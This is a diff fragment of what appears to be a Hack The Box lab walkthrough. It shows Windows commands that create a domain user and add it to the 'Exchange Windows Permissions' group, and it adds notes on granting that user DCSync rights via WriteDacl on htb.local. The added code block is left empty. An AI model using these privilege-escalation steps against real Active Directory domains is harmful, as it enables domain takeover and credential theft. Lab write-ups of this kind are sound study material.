@@ -305,3 +305,8 @@ C:\> net user random passwd123 /add /domain
 ```CSS
 C:\> net group "Exchange Windows Permissions" random /add /domain
 ```
+  - Give the user DcSync privileges.
+  - This is possible because the user is a part of the Exchange Windows Permissions group which has WriteDacl permission on the htb.local domain.
+```CSS
+▶ 
+```
